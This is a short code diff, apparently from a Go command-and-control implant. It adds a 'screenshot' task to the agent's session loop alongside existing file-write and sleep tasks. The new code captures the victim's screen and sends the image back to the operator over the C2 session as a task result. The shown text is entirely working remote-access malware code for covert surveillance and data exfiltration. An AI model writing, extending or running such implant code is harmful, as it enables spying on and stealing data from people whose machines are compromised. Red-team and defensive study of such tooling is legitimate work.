@@ -224,6 +224,25 @@ func runSession(cfg *Config) error {
 				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
 				log.Printf("[+] WriteFile completed in %dms", durationMs)
 
+			case "screenshot":
+				log.Printf("[*] Capturing screenshot")
+				output, captureErr := CaptureScreenshot()
+				durationMs := uint32(time.Since(start).Milliseconds())
+				result := protocol.TaskResult{
+					TaskID:     task.TaskID,
+					AgentID:    cfg.AgentID,
+					Status:     "completed",
+					Output:     output,
+					DurationMs: durationMs,
+				}
+				if captureErr != nil {
+					result.Status = "error"
+					result.ErrorMsg = captureErr.Error()
+				}
+				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
+				log.Printf("[+] Screenshot task %s completed in %dms (%d bytes)",
+					task.TaskID, durationMs, len(output))
+
 			case "sleep":
 				var newInterval uint32
 				fmt.Sscanf(task.Arguments, "%d", &newInterval)
